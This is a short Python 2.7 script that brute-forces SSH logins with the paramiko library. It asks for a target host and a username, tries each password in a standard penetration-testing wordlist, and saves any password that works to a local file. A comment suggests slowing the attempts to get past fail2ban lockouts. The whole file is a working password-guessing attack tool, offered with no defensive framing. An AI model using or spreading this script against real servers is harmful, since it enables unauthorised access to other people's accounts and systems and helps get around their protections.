#!/usr/bin/python2.7

import paramiko                             # SSH lib
from subprocess import call                 # My lazy way to clear the terminal output
from time import sleep
ssh = paramiko.SSHClient()                  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

call("clear")
# Get information from user
target = raw_input("Enter Target:\n>>> ")
c = call("clear")
usr = raw_input("Enter Username:\n>>> ")
call("clear")
call(['touch', 'passwd.lst'])
# open password list
f = open('/usr/share/wordlists/fasttrack.txt')

for each_line in f:
    try:    
        print ('Trying %s ' % each_line)
        ssh.connect(target, username= usr, password= each_line.rstrip())
        ssh.close()
        w = open('passwd.lst','w')
        w.write('%s@%s  %s' % ( usr, target, each_line))
        print ':)'
    except paramiko.ssh_exception.AuthenticationException:
            print "Failed"
    except paramiko.ssh_exception.SSHException:
            print "Failed"
    finally:
        ssh.close()
        #sleep(5)                              # delay if attacking ssh with fail2ban
        call("clear")
    
exit(0)
    
